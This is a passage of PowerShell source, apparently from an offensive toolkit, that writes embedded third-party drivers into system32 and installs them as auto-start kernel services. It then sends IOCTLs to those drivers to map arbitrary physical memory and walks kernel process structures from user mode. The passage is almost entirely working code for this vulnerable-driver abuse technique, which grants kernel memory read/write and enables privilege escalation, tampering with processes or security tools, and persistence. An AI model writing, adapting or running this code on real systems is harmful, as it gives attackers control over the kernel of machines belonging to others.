# "ipctype", "mtxvxd", "winio", "DevMem", "iobios", "wdisvhost", "ASMMAP", "LallaMon", "SliffDriver", "pmxdrv"
Function Map-VirtualAddress {
    param (
      [IntPtr]$VA = [IntPtr]::Zero,
      [Int64]$PA = 0L,

      [Int32]$BlockSize,
      [ValidateSet("ipctype", "mtxvxd", "winio", "DevMem", "iobios", "wdisvhost", "ASMMAP", "LallaMon", "SliffDriver", "pmxdrv")]
      [String]$DriverName,
      [IntPtr]$handle = [IntPtr]::Zero
    )

    if (-not [File]::Exists("C:\windows\system32\CorMem.sys")) {
        Import-EmbeddedBlock -BlockName CorMem -OutPath 'C:\windows\system32\CorMem.sys' | Out-Null
    }

    if ($PA -eq 0L) {
        try {
            $hCorMem = Get-FileHandle -FileName CorMem
            if ($null -eq $hCorMem -or $hCorMem -eq 0) { 
                throw "Invalid handle." 
            }
            $TransInPtr = New-IntPtr -Size 8 -InitialValue $VA -UsePointerSize
            if (-not $NtApi::DeviceIoControl($hCorMem, 2236444, $TransInPtr, 8, $TransInPtr, 8, [IntPtr]::Zero, [IntPtr]::Zero)) { throw "Translation failed." }
            $PA = [Marshal]::ReadInt64($TransInPtr)
        } catch {
            # Do nothing
        }
        finally {
            Free-IntPtr $TransInPtr -Method Auto; 
            Free-IntPtr $hCorMem -Method NtHandle
        }
        if ($PA -eq 0) {
            try { $PA = Convert-VirtualToPhysical -VirtualAddress $VA } catch {}
        }
        if ($PA -eq 0) { 
            return Write-Error "Invalid physical address resolved."
        }
    }

    switch ($DriverName) {
        "ipctype" { 
            if (-not [File]::Exists("C:\windows\system32\ipctype.sys")) {
                Import-EmbeddedBlock -BlockName ipctype -OutPath 'C:\windows\system32\ipctype.sys' | Out-Null
            }
        }
        "mtxvxd" {
            if (-not [File]::Exists("C:\windows\system32\mtxC9CB.sys")) {
                Import-EmbeddedBlock -BlockName mtxvxd -OutPath 'C:\windows\system32\mtxC9CB.sys' | Out-Null
            }
        }
        "devMem" {
            if (-not [File]::Exists("C:\windows\system32\devMem.sys")) {
                Import-EmbeddedBlock -BlockName devMem -OutPath 'C:\windows\system32\devMem.sys' | Out-Null
            }
        }
        "iobios" {
            if (-not [File]::Exists("C:\windows\system32\iobios64.sys")) {
                Import-EmbeddedBlock -BlockName iobios -OutPath 'C:\windows\system32\iobios64.sys' | Out-Null
            }
        }
        "wdisvhost" {
            if (-not [File]::Exists("C:\windows\system32\wdisvhost.sys")) {
                Import-EmbeddedBlock -BlockName wdisvhost -OutPath 'C:\windows\system32\wdisvhost.sys' | Out-Null
            }
        }
        "winio" {
            if (-not [File]::Exists("C:\windows\system32\PGRHostControl.sys")) {
                Import-EmbeddedBlock -BlockName PGRHostControl -OutPath 'C:\windows\system32\PGRHostControl.sys' | Out-Null
            }
        }
        "ASMMAP" {
            if (-not [File]::Exists("C:\windows\system32\ASMMAP64.sys")) {
                Import-EmbeddedBlock -BlockName ASMMAP -OutPath 'C:\windows\system32\ASMMAP64.sys' | Out-Null
            }
        }
        "LallaMon" {
            if (-not [File]::Exists("C:\windows\system32\LallaMon.sys")) {
                Import-EmbeddedBlock -BlockName LallaMon -OutPath 'C:\windows\system32\LallaMon.sys' | Out-Null
            }
        }
        "SliffDriver" {
            if (-not [File]::Exists("C:\windows\system32\lsigetwin_SliffDriver.sys")) {
                Import-EmbeddedBlock -BlockName SliffDriver -OutPath 'C:\windows\system32\lsigetwin_SliffDriver.sys' | Out-Null
            }
        }
        "pmxdrv" {
            if (-not [File]::Exists("C:\windows\system32\pmxdrv64.sys")) {
                Import-EmbeddedBlock -BlockName pmxdrv -OutPath 'C:\windows\system32\pmxdrv64.sys' | Out-Null
            }
        }
    }

    $IOCTL = 0x0
    $OutBuffer = [IntPtr]::Zero
    $OutBufferSize = 0x00

    switch ($DriverName) {
        "ipctype"     { $IOCTL = 0x80102040  }
        "mtxvxd"      { $IOCTL = 0x9C40644C  }
        "winio"       { $IOCTL = 0x80102040  }
        "DevMem"      { $IOCTL = -0x7FFFDF80 }
        "iobios"      { $IOCTL = -0x5FFD118  }
        "wdisvhost"   { $IOCTL = 0x80002000  }
        "ASMMAP"      { $IOCTL = 0x9C402580  }
        "LallaMon"    { $IOCTL = 0xA00A2800  }
        "SliffDriver" { $IOCTL = 0x80002004  }
        "pmxdrv"      { $IOCTL = 0x00222AB8  }
    }

    if ($DriverName -eq 'ipctype') {

        $Handle   = Get-FileHandle -FileName 'ipctype'
        if ($Handle -eq $null -or $Handle -eq 0) {
            throw "Cant get device handle" }

        $DataSize = 0x1C
        $DataPtr  = New-IntPtr -Size 0x1C
        $OutBuffer = [IntPtr]$DataPtr
        $OutBufferSize = 0x1C
    
        [marshal]::WriteInt32($DataPtr, 0x8, $BlockSize)
        [marshal]::WriteInt64($DataPtr, 0xC, $PA)
    
    } elseif ($DriverName -eq 'pmxdrv') {

        $Handle   = Get-FileHandle -FileName 'Pmxdrv64' -AlternativeName 'Pmxdrv' -Symbolic 'Device'
        if ($Handle -eq $null -or $Handle -eq 0) {
            throw "Cant get device handle" }

        # 1. Build the inner packet layout structure
        $PacketSize = 24
        $TargetPA = $PA
        
        # Dynamic fallback alignment patch
        if ($TargetPA -eq 0) { $TargetPA = 1 }

        $PacketBytes = New-Object Byte[] $PacketSize
        [System.BitConverter]::GetBytes([Int32]$PacketSize).CopyTo($PacketBytes, 0)
        [System.BitConverter]::GetBytes([Int64]$TargetPA).CopyTo($PacketBytes, 4)
        [System.BitConverter]::GetBytes([Int32]$BlockSize).CopyTo($PacketBytes, 12)
        [System.BitConverter]::GetBytes([Int64]0).CopyTo($PacketBytes, 16)

        $PacketPtr = [Marshal]::AllocHGlobal($PacketSize)
        [Marshal]::Copy($PacketBytes, 0, $PacketPtr, $PacketSize)

        # 2. Build the primary outer interface wrapper pointing to the packet
        $DataSize = 16
        $InputBufferBytes = New-Object Byte[] $DataSize
        [System.BitConverter]::GetBytes([Int64]$PacketPtr).CopyTo($InputBufferBytes, 0)
        [System.BitConverter]::GetBytes([Int32]($DataSize + $PacketSize)).CopyTo($InputBufferBytes, 8)
        [System.BitConverter]::GetBytes([Int32]0).CopyTo($InputBufferBytes, 12)

        $DataPtr = [Marshal]::AllocHGlobal($DataSize)
        [Marshal]::Copy($InputBufferBytes, 0, $DataPtr, $DataSize)
        
        # In-place tracking configuration
        $OutBuffer = [IntPtr]::Zero
        $OutBufferSize = 0

    } elseif ($DriverName -eq 'mtxvxd') {

        $Handle   = Get-FileHandle -FileName 'mtxC9CB' -AlternativeName 'MtxVxd' -Symbolic 'Device'
        if ($Handle -eq $null -or $Handle -eq 0) {
            throw "Cant get device handle" }

        $DataSize = 0x10
        $DataPtr  = New-IntPtr -Size 0x10
        $OutBuffer = New-IntPtr -Size 0x8
        $OutBufferSize = 8
    
        [marshal]::WriteInt64($DataPtr, 0x0, $PA)
        [marshal]::WriteInt32($DataPtr, 0x8, $BlockSize)
        [marshal]::WriteInt32($DataPtr, 0xC, 0)

    } elseif ($DriverName -eq "winio") { 

       #$Handle = Get-FileHandle -FileName 'WinIo64' -AlternativeName 'WinIo' -Symbolic 'Device'
        $Handle = Get-FileHandle -FileName 'PGRHostControl' -AlternativeName 'PGRHostControl' -Symbolic 'Device'
        if ($Handle -eq $null -or $Handle -eq 0) {
            throw "Cant get device handle" }

        # Use a single buffer for both input and output (in-place)
        $DataSize      = 0x28
        $DataPtr       = New-IntPtr -Size 0x28
    
        $OutBuffer     = [IntPtr]$DataPtr
        $OutBufferSize = 0x28

        # WinIo expects: Src[0] = BlockSize, Src[1] = PhysicalAddress
        [marshal]::WriteInt64($DataPtr, 0x0, [Int64]$BlockSize)
        [marshal]::WriteInt64($DataPtr, 0x8, [Int64]$PA)

    } elseif ($DriverName -eq "DevMem") { 

        $Handle = Get-FileHandle -FileName 'DevMem'
        if ($Handle -eq $null -or $Handle -eq 0) {
            throw "Cant get device handle" }

        $mapInputBuffer = New-Object Byte[] 8
        [BitConverter]::GetBytes([UInt32]$PA).CopyTo($mapInputBuffer, 0)    # Offset 0: 32-bit Physical Address
        [BitConverter]::GetBytes([UInt32]$BlockSize).CopyTo($mapInputBuffer, 4)  # Offset 4: 32-bit Length

        # Use a single buffer for both input and output (in-place)
        $DataSize      = 8
        $DataPtr       = New-IntPtr -Data $mapInputBuffer
    
        $OutBuffer     = [IntPtr]$DataPtr
        $OutBufferSize = 8

    } elseif ($DriverName -eq "iobios") { 

        $Handle = Get-FileHandle -FileName 'iobios64' -AlternativeName 'iobios'
        if ($Handle -eq $null -or $Handle -eq 0) {
            throw "Cant get device handle" }

        $mapInputBuffer = New-Object Byte[] 32
        [BitConverter]::GetBytes([UInt32]$BlockSize).CopyTo($mapInputBuffer, 8)
        [BitConverter]::GetBytes([UInt32]$PA).CopyTo($mapInputBuffer, 12)
        $DataPtr = New-IntPtr -Data $mapInputBuffer

        # Use a single buffer for both input and output (in-place)
        $DataSize      = 32
        $DataPtr       = New-IntPtr -Data $mapInputBuffer
    
        $OutBuffer     = [IntPtr]$DataPtr
        $OutBufferSize = 32

    } elseif ($DriverName -eq "wdisvhost") { 

        $Handle = Get-FileHandle -FileName 'wdisvhost' -AlternativeName 'PhyMem'
        if ($Handle -eq $null -or $Handle -eq 0) {
            throw "Cant get device handle" }

        $mapInputBuffer = New-Object Byte[] 16
        [BitConverter]::GetBytes([Int64]$PA).CopyTo($mapInputBuffer, 0)
        [BitConverter]::GetBytes([UInt32]$BlockSize).CopyTo($mapInputBuffer, 8)

        # Use a single buffer for both input and output (in-place)
        $DataSize      = 16
        $DataPtr       = New-IntPtr -Data $mapInputBuffer
    
        $OutBuffer     = [IntPtr]$DataPtr
        $OutBufferSize = 8

    } elseif ($DriverName -eq "ASMMAP") { 

        $Handle = Get-FileHandle -FileName 'ASMMAP64'
        if ($Handle -eq $null -or $Handle -eq 0) {
            throw "Cant get device handle" }

        $mapInputBuffer = New-Object Byte[] 24  # +8 bytes to match struct
        [BitConverter]::GetBytes([Int64]$PA).CopyTo($mapInputBuffer, 0)   # BusAddressLow
        [BitConverter]::GetBytes(0).CopyTo($mapInputBuffer, 8)                 # BusAddressHigh = output
        [BitConverter]::GetBytes([Int64]$BlockSize).CopyTo($mapInputBuffer, 16) # Length at offset 0x10

        # Use a single buffer for both input and output (in-place)
        $DataSize      = 24
        $DataPtr       = New-IntPtr -Data $mapInputBuffer
    
        $OutBuffer     = [IntPtr]$DataPtr
        $OutBufferSize = 24

    } elseif ($DriverName -eq "LallaMon") {

        $Handle = Get-FileHandle -FileName 'LallaMon' -Symbolic 'Device'
        if ($Handle -eq $null -or $Handle -eq 0) { 
            throw "Cant get LallaMon device handle" 
        }
        $DataSize      = 16
        $DataPtr       = New-IntPtr -Size 16
        $OutBuffer     = [IntPtr]$DataPtr
        $OutBufferSize = 16
        [Marshal]::WriteInt64($DataPtr, 0, $PA)
        [Marshal]::WriteInt64($DataPtr, 8, $BlockSize)

    } elseif ($DriverName -eq "SliffDriver") {

        $Handle = Get-FileHandle -FileName 'lsigetwin_SliffDriver' -AlternativeName 'SliffDriver'
        if ($Handle -eq $null -or $Handle -eq 0) { 
            throw "Cant get SliffDriver device handle" 
        }
        $DataSize      = 32
        $DataPtr       = New-IntPtr -Size 32
        
        $OutBuffer     = $DataPtr
        $OutBufferSize = 8
        
        [Marshal]::WriteInt64($DataPtr, 0x08, $PA)
        [Marshal]::WriteInt32($DataPtr, 0x18, $BlockSize)
    }

    try {
        if ($Handle -eq 0) {
            try {
                throw "Fail to get an handle for Driver"
            } finally {
                [marshal]::FreeHGlobal($OutBuffer)
            }
        }
        $ByteRet = New-IntPtr -Size 8
        if (-not $NtApi::DeviceIoControl(
            $Handle, $IOCTL,
            $DataPtr, $DataSize,
            $OutBuffer, $OutBufferSize,
            $ByteRet, [IntPtr]::Zero)) {
                throw "DeviceIoControl Call Failed"
        }

        $va = 0L
        $KeepHandle = $false
        if ($DriverName -eq 'mtxvxd') {
            $va = [marshal]::ReadInt64($OutBuffer)
            [marshal]::FreeHGlobal($OutBuffer)
            return $va
        } elseif ($DriverName -eq 'ipctype') {
            $va = [marshal]::ReadInt64($DataPtr, 0x14)
            return $va
        } elseif ($DriverName -eq "winio") {
            return [pscustomobject][ordered]@{
                SectionHandle   = [Marshal]::ReadInt64($DataPtr, 0x10)    # SectionHandle
                MappedAddress   = [Marshal]::ReadIntPtr($DataPtr, 0x18)   # VirtualAddress
                ObjectReference = [Marshal]::ReadInt64($DataPtr, 0x20)    # ObjectReference (for cleanup)
            }
        } elseif ($DriverName -eq "DevMem") {
            $va = [marshal]::ReadInt64($DataPtr)
            return $va
        } elseif ($DriverName -eq "iobios") {
            return (
                [pscustomobject][ordered]@{
                    MappedAddress = [Marshal]::ReadIntPtr($DataPtr, 16)
                    SectionHandle = [Marshal]::ReadInt64($DataPtr, 0)
                }
            )
        } elseif ($DriverName -eq "wdisvhost") {
            return (
                [pscustomobject][ordered]@{
                    MappedAddress = [Marshal]::ReadIntPtr($DataPtr, 0)
                    BlockSize = $BlockSize
                }
            )
        } elseif ($DriverName -eq "ASMMAP") {
            $va = [marshal]::ReadInt64($DataPtr, 8)
            return $va
        } elseif ($DriverName -eq "LallaMon") {
            # Returns a raw address string/long, but tracking dynamic size context needs the BlockSize
            return [pscustomobject][ordered]@{
                MappedAddress = [Marshal]::ReadInt64($DataPtr, 0)
                BlockSize     = $BlockSize
            }
        } elseif ($DriverName -eq "SliffDriver") {
            # Returns the pointer generated in place inside index zero of output buffer
            return [pscustomobject][ordered]@{
                MappedAddress = [Marshal]::ReadInt64($DataPtr, 0)
                BlockSize     = $BlockSize
            }
        } elseif ($DriverName -eq "pmxdrv") {
            $va = [marshal]::ReadInt64($PacketPtr, 16)
            return $va
        }
    }
    finally {
        Free-IntPtr $ByteRet
        Free-IntPtr $DataPtr
        Free-IntPtr $PacketPtr
        if (-not $KeepHandle) {
            Free-IntPtr -handle $Handle -Method NtHandle
        }
    }
}
Function Unmap-VirtualAddress {
    param (
        [Parameter(Mandatory=$true, Position=0)]
        [Object]$MappedAddress,
        
        [ValidateSet("ipctype", "mtxvxd", "winio", "DevMem", "iobios", "wdisvhost", "ASMMAP", "LallaMon", "SliffDriver", "pmxdrv")]
        [String]$DriverName
    )
    [Int32]$MapSize = 0
    [Int64]$SectionHandle = 0L
    $ActualAddress = 0L

    # Auto-extract parameters if object is passed, else handle raw address
    if ($MappedAddress -is [System.Management.Automation.PSCustomObject]) {
        $ActualAddress = [Int64]$MappedAddress.MappedAddress
        if ($MappedAddress.PSObject.Properties['BlockSize']) { 
            $MapSize = [Int32]$MappedAddress.BlockSize 
        }
        if ($MappedAddress.PSObject.Properties['SectionHandle']) { 
            $SectionHandle = [Int64]$MappedAddress.SectionHandle 
        }
        if ($MappedAddress.PSObject.Properties.Name -contains 'ObjectReference') {
            $ObjectReference = [Int64]$MappedAddress.ObjectReference
        }
    } else {
        $ActualAddress = [Int64]$MappedAddress
    }

    # Driver extraction checks
    switch ($DriverName) {
        "ipctype" { 
            if (-not [File]::Exists("C:\windows\system32\ipctype.sys")) {
                Import-EmbeddedBlock -BlockName ipctype -OutPath 'C:\windows\system32\ipctype.sys' | Out-Null
            }
        }
        "mtxvxd" {
            if (-not [File]::Exists("C:\windows\system32\mtxC9CB.sys")) {
                Import-EmbeddedBlock -BlockName mtxvxd -OutPath 'C:\windows\system32\mtxC9CB.sys' | Out-Null
            }
        }
        "devMem" {
            if (-not [File]::Exists("C:\windows\system32\devMem.sys")) {
                Import-EmbeddedBlock -BlockName devMem -OutPath 'C:\windows\system32\devMem.sys' | Out-Null
            }
        }
        "iobios" {
            if (-not [File]::Exists("C:\windows\system32\iobios64.sys")) {
                Import-EmbeddedBlock -BlockName iobios -OutPath 'C:\windows\system32\iobios64.sys' | Out-Null
            }
        }
        "wdisvhost" {
            if (-not [File]::Exists("C:\windows\system32\wdisvhost.sys")) {
                Import-EmbeddedBlock -BlockName wdisvhost -OutPath 'C:\windows\system32\wdisvhost.sys' | Out-Null
            }
        }
        "winio" {
            if (-not [File]::Exists("C:\windows\system32\PGRHostControl.sys")) {
                Import-EmbeddedBlock -BlockName PGRHostControl -OutPath 'C:\windows\system32\PGRHostControl.sys' | Out-Null
            }
        }
        "ASMMAP" {
            if (-not [File]::Exists("C:\windows\system32\ASMMAP64.sys")) {
                Import-EmbeddedBlock -BlockName ASMMAP -OutPath 'C:\windows\system32\ASMMAP64.sys' | Out-Null
            }
        }
        "LallaMon" {
            if (-not [File]::Exists("C:\windows\system32\LallaMon.sys")) {
                Import-EmbeddedBlock -BlockName LallaMon -OutPath 'C:\windows\system32\LallaMon.sys' | Out-Null
            }
        }
        "SliffDriver" {
            if (-not [File]::Exists("C:\windows\system32\lsigetwin_SliffDriver.sys")) {
                Import-EmbeddedBlock -BlockName SliffDriver -OutPath 'C:\windows\system32\lsigetwin_SliffDriver.sys' | Out-Null
            }
        }
        "pmxdrv" {
            if (-not [File]::Exists("C:\windows\system32\pmxdrv64.sys")) {
                Import-EmbeddedBlock -BlockName pmxdrv -OutPath 'C:\windows\system32\pmxdrv64.sys' | Out-Null
            }
        }
    }

    $IOCTL     = 0
    $DataSize  = 0
    $OutSize   = 0
    $Handle    = [IntPtr]::Zero
    $DataPtr   = [IntPtr]::Zero
    $OutPtr    = [IntPtr]::Zero
    $PacketPtr = [IntPtr]::Zero
    $RetPtr    = New-IntPtr -Size 8

    switch ($DriverName) {
        "ipctype" {
            $DataSize = 0x1C 
            $DataPtr = New-IntPtr -Size $DataSize
            [marshal]::WriteInt64($DataPtr, 0x14, $ActualAddress)
            $IOCTL = -2146426812 
            $Handle = Get-FileHandle -FileName 'ipctype'
        }
        "mtxvxd" { 
            $DataSize = 8 
            $DataPtr = New-IntPtr -Size $DataSize
            [marshal]::WriteInt64($DataPtr, 0x0, $ActualAddress)
            $IOCTL = -1673501616 
            $Handle   = Get-FileHandle -FileName 'mtxC9CB' -AlternativeName 'MtxVxd' -Symbolic 'Device'
        }
        "winio" { 
            $DataSize = 0x28
            $DataPtr = New-IntPtr -Size $DataSize
            [Marshal]::WriteInt64($DataPtr, 0x10, [Int64]$SectionHandle)
            [Marshal]::WriteIntPtr($DataPtr, 0x18, [IntPtr]$ActualAddress)
            [Marshal]::WriteInt64($DataPtr, 0x20, [Int64]$ObjectReference)
            $IOCTL = 0x80102044
           #$Handle = Get-FileHandle -FileName 'WinIo64' -AlternativeName 'WinIo' -Symbolic 'Device'
            $Handle = Get-FileHandle -FileName 'PGRHostControl' -AlternativeName 'PGRHostControl' -Symbolic 'Device'
        }
        "DevMem" {
            $DataSize = 8
            $DataPtr = New-IntPtr -Size $DataSize
            [marshal]::WriteInt64($DataPtr, 0x0, $ActualAddress)
            $IOCTL = -0x7FFFDF7C
            $Handle = Get-FileHandle -FileName 'DevMem'
        }
        "iobios" {
            $DataSize = 32
            $OutSize  = 32
            $IOCTL    = -0x5FFD114

            $unmapBuffer = New-Object Byte[] 32
            [BitConverter]::GetBytes([Int64]$SectionHandle).CopyTo($unmapBuffer, 0)
            [BitConverter]::GetBytes([Int64]$ActualAddress).CopyTo($unmapBuffer, 16)
            $DataPtr = New-IntPtr -Data $unmapBuffer
            $OutPtr  = New-IntPtr -Data $unmapBuffer
            $Handle = Get-FileHandle -FileName 'iobios64' -AlternativeName 'iobios'
        }
        "wdisvhost" {
            $DataSize = 16
            $OutSize  = 0
            $IOCTL    = 0x80002004

            $unmapBuffer = New-Object Byte[] 16
            [BitConverter]::GetBytes([Int64]$ActualAddress).CopyTo($unmapBuffer, 0)
            [BitConverter]::GetBytes([UInt32]$MapSize).CopyTo($unmapBuffer, 8)
            $DataPtr = New-IntPtr -Data $unmapBuffer
            $OutPtr  = New-IntPtr -Data $unmapBuffer
            $Handle = Get-FileHandle -FileName 'wdisvhost' -AlternativeName 'PhyMem'
        }
        "ASMMAP" {
            $DataSize = 24
            $IOCTL    = 0x9C402584

            $unmapBuffer = New-Object Byte[] 24
            [BitConverter]::GetBytes([Int64]$ActualAddress).CopyTo($unmapBuffer, 8)
            $DataPtr = New-IntPtr -Data $unmapBuffer
            $Handle = Get-FileHandle -FileName 'ASMMAP64'
        }
        "LallaMon"    {
            $DataSize = 16
            $OutSize  = 16
            $IOCTL    = 0xA00A2804
            $DataPtr  = New-IntPtr -Size 16
            $OutPtr   = $DataPtr
            [Marshal]::WriteInt64($DataPtr, 0, $ActualAddress)
            [Marshal]::WriteInt64($DataPtr, 8, $MapSize)
            $Handle   = Get-FileHandle -FileName 'LallaMon' -Symbolic 'Device'
        }
        "SliffDriver" {
            $DataSize = 32
            $OutSize  = 32
            $IOCTL    = 0x8000200C
            $DataPtr  = New-IntPtr -Size 32
            $OutPtr   = $DataPtr
            [Marshal]::WriteInt64($DataPtr, 0x00, $ActualAddress)
           #[Marshal]::WriteInt64($DataPtr, 0x08, $PA)
            [Marshal]::WriteInt32($DataPtr, 0x18, $MapSize)
            $Handle   = Get-FileHandle -FileName 'lsigetwin_SliffDriver' -AlternativeName 'SliffDriver'
        }
        "pmxdrv" {
            $IOCTL = 0x00222ABC
            $Handle = Get-FileHandle -FileName 'Pmxdrv64' -AlternativeName 'Pmxdrv' -Symbolic 'Device'

            # 1. Outer unmap inner packet structure (24 bytes)
            $UnmapPacketSize = 24
            $UnmapPacketBytes = New-Object Byte[] $UnmapPacketSize
            [System.BitConverter]::GetBytes([Int32]$UnmapPacketSize).CopyTo($UnmapPacketBytes, 0)
            [System.BitConverter]::GetBytes([Int64]0).CopyTo($UnmapPacketBytes, 4)
            [System.BitConverter]::GetBytes([Int64]$ActualAddress).CopyTo($UnmapPacketBytes, 16)

            $PacketPtr = [Marshal]::AllocHGlobal($UnmapPacketSize)
            [Marshal]::Copy($UnmapPacketBytes, 0, $PacketPtr, $UnmapPacketSize)

            # 2. Base communication interface wrapper buffer (16 bytes)
            $DataSize = 16
            $ComputedInputSize = $DataSize + $UnmapPacketSize
            
            $InputBufferBytes = New-Object Byte[] $DataSize
            [System.BitConverter]::GetBytes([Int64]$PacketPtr).CopyTo($InputBufferBytes, 0)
            [System.BitConverter]::GetBytes([Int32]$ComputedInputSize).CopyTo($InputBufferBytes, 8)
            [System.BitConverter]::GetBytes([Int32]0).CopyTo($InputBufferBytes, 12)

            $DataPtr = [Marshal]::AllocHGlobal($DataSize)
            [Marshal]::Copy($InputBufferBytes, 0, $DataPtr, $DataSize)

            $OutPtr = [IntPtr]::Zero
            $OutSize = 0
        }
    }

    try {
        $hr = $NtApi::DeviceIoControl(
                $Handle,   $IOCTL,
                $DataPtr,  $DataSize,
                $OutPtr,   $OutSize,
                $RetPtr,  [IntPtr]::Zero)
        return $hr
            
    }
    finally {
        Free-IntPtr $DataPtr
        if ($DriverName -notmatch "LallaMon|SliffDriver") { 
            Free-IntPtr $OutPtr
        }
        Free-IntPtr $RetPtr
        Free-IntPtr $PacketPtr
        Free-IntPtr -handle $Handle -Method NtHandle
    }
    return $false
}
#endregion
#region Base
Function Get-FileHandle {
    param(
        $FileName = '',
        $AlternativeName = '',
        $Symbolic = '??'
    )

    if ([String]::IsNullOrEmpty($AlternativeName)) {
        $AlternativeName = $FileName
    }

    $Service = Get-Service -Name $FileName -ErrorAction SilentlyContinue
    if (!$Service) {
        sc.exe create $FileName type= kernel start= auto binPath= C:\windows\system32\$FileName.sys DisplayName= "Some Text" | Out-Null
        Start-Service -Name $FileName | Out-Null
        Start-Sleep -Seconds 1 | Out-Null
    } elseif ($Service.Status -ne 'Running'){
        Restart-Service -Name $FileName -Force | Out-Null
        Start-Sleep -Seconds 1 | Out-Null
    }
    $Service = Get-Service -Name $FileName
    if (!$Service -or $Service.Status -ne 'Running') {
        Write-Host
        Write-Warning "Service Fail to load ... Safe Exit"
        Write-Host
        Start-Sleep 1
        throw "Fail to Load Service"
    }

    $FileHandle = [IntPtr]::Zero
    $IoStatusBlock    = New-IntPtr -Size 16
    $ObjectAttributes = New-IntPtr -Size 48 -WriteSizeAtZero
    $filePath = "\$Symbolic\$AlternativeName"
    $ObjectName = Init-NativeString -Encoding Unicode -Value $filePath
    [Marshal]::WriteIntPtr($ObjectAttributes, 0x10, $ObjectName)
    [Marshal]::WriteInt32($ObjectAttributes,  0x18, 0x40) # OBJ_CASE_INSENSITIVE
    
    $hr = $NtApi::NtCreateFile(
        ([ref]$FileHandle),   # OUT HANDLE
        0xC0000000,           # DesiredAccess (GENERIC_READ | GENERIC_WRITE)
        $ObjectAttributes,    # POBJECT_ATTRIBUTES
        $IoStatusBlock,       # PIO_STATUS_BLOCK
        [IntPtr]::Zero,       # AllocationSize
        0x00,                 # FileAttributes
        0x03,                 # ShareAccess (FILE_SHARE_READ | FILE_SHARE_WRITE)
        0x01,                 # CreateDisposition (FILE_OPEN matching OPEN_EXISTING)
        0x00,                 # CreateOptions
        [IntPtr]::Zero,       # EaBuffer
        0x00                  # EaLength
    )
    if ($hr -ne 0) {
        $err = Parse-ErrorMessage -MessageId $hr -Flags NTSTATUS
        Write-Warning "End with Error: $hr {$err}"
    }
    Free-IntPtr -handle $IoStatusBlock
    Free-IntPtr -handle $ObjectAttributes
    Free-NativeString -StringPtr $ObjectName
    if ($hr -eq 0x0) {
        return $FileHandle
    }
    return [IntPtr]::Zero
}
Function Get-KernelBaseAddress {
    [CmdletBinding()]
    Param(
      [Parameter(Position = 0)]
      [ValidateSet('Auto', 'Query', 'Enum')]
      [String]$Method = 'Auto'
    )

    $base = [IntPtr]::Zero

    # Path A: NTDLL RtlEngine
    if ($Method -in @('Auto', 'Query')) {
        [Int32]$sz = 0
        if ($NtApi::RtlQueryModuleInformation([ref]$sz, 272, [IntPtr]::Zero) -eq 0 -and $sz -gt 0) {
            $buf = [Marshal]::AllocHGlobal($sz)
            if ($NtApi::RtlQueryModuleInformation([ref]$sz, 272, $buf) -eq 0) { $base = [Marshal]::ReadIntPtr($buf) }
            [Marshal]::FreeHGlobal($buf)
        }
    }

    # Path B: KernelBase Fallback
    if ($base -eq [IntPtr]::Zero -and $Method -in @('Auto', 'Enum')) {
        [Int32]$req = 0
        $NtApi::EnumDeviceDrivers([IntPtr]::Zero, 0, [ref]$req) | Out-Null
        if ($req -gt 0) {
            $buf = [Marshal]::AllocHGlobal($req)
            if ($NtApi::EnumDeviceDrivers($buf, $req, [ref]$req)) { $base = [Marshal]::ReadIntPtr($buf) }
            [Marshal]::FreeHGlobal($buf)
        }
    }

    if ($base -eq [IntPtr]::Zero) { Write-Error "Failed to extract Kernel Base address."; return [IntPtr]::Zero }
    return $base
}
Function Get-KernelProcessBases {
    [CmdletBinding()]
    Param(
        [IntPtr]$KernelAddress,
        [Int32]$ProcessID = 0,
        [Int64]$SystemProcessOffset,
        [Int32]$ActiveProcessLinksOffset = $Global:ActiveOffset,
        [Int32]$UniqueProcessIdOffset   = ($Global:ActiveOffset - 8),
        [Int32]$ExitStatusOffset        = $Global:ExitStatusOffset,
        [switch]$FilterActiveProcess
    )

    $ProcessBases = [System.Collections.Generic.List[IntPtr]]::new()

    if ($SystemProcessOffset -eq 0 -or $KernelAddress -eq [IntPtr]::Zero) {
        Write-Error "Invalid Kernel Base or System Process Offset."
        return $ProcessBases
    }

    <#
        PsActiveProcessHead style traversal
        SYSTEM _EPROCESS.ActiveProcessLinks acts as:
        - valid process node
        - circular list anchor
    #>

    # SYSTEM _EPROCESS
    $SystemEprocessPtr = [IntPtr](Read-VirtualAddress -VA (
        [IntPtr]::Add($KernelAddress, $SystemProcessOffset)
    ) -AsLong)

    # SYSTEM ActiveProcessLinks LIST_ENTRY
    $ListHeadPtr = [IntPtr]::Add(
        $SystemEprocessPtr,
        $ActiveProcessLinksOffset
    )

    <#
        ActiveProcessLinks is embedded inside _EPROCESS.
        Therefore LIST_ENTRY pointers do NOT point to
        base address of _EPROCESS, but to:
            _EPROCESS.ActiveProcessLinks
    #>

    $EprocessOffsetMap = @{
        UniqueProcessId =
            $UniqueProcessIdOffset - $ActiveProcessLinksOffset
    }

    <#
        IMPORTANT:
        Unlike PEB loader lists, ActiveProcessLinks head
        belongs to SYSTEM process itself.
        So traversal starts AT ListHeadPtr,
        not Flink(ListHeadPtr).
    #>
    $NextLinkPtr = $ListHeadPtr

    do {

        if ($NextLinkPtr -eq [IntPtr]::Zero) {
            break
        }

        $CurrentPid = Read-VirtualAddress -VA (
            [IntPtr]::Add(
                $NextLinkPtr,
                $EprocessOffsetMap['UniqueProcessId']
            )
        ) -AsLong

        $CurrentEprocessBase = [IntPtr](
            $NextLinkPtr.ToInt64() - $ActiveProcessLinksOffset
        )

                # --- Filter Active Logic ---
        if ($FilterActiveProcess.IsPresent) {
            # Read the 32-bit ExitStatus integer using your provided offset
            $ExitStatusRaw = Read-VirtualAddress -VA (
                [IntPtr]::Add($CurrentEprocessBase, $ExitStatusOffset)
            ) -AsInt

            # If it's NOT active (0x00000103 = STILL_ACTIVE), skip it and advance the link
            if ($ExitStatusRaw -ne 0x00000103) {
                $NextLinkPtr = [IntPtr](Read-VirtualAddress -VA $NextLinkPtr -AsLong)
                continue
            }
        }

        if ($ProcessID -gt 0) {
            if ($CurrentPid -eq $ProcessID) {
                $ProcessBases.Add($CurrentEprocessBase)
                break
            }
        } else {
            $ProcessBases.Add($CurrentEprocessBase)
        }

        # LIST_ENTRY -> Flink --> Next process LIST_ENTRY
        $NextLinkPtr = [IntPtr](Read-VirtualAddress -VA $NextLinkPtr -AsLong)

    } while ($NextLinkPtr -ne $ListHeadPtr)
    
    return $ProcessBases
}
Function ConvertFrom-EprocessStruct {
    Param(
        [IntPtr]$EprocessBase,
        [Int32]$UniqueProcessIdOffset        = ($Global:ActiveOffset - 8),
        [Int32]$ImageFileNameOffset          = ($Global:ImageFileNameOffset),
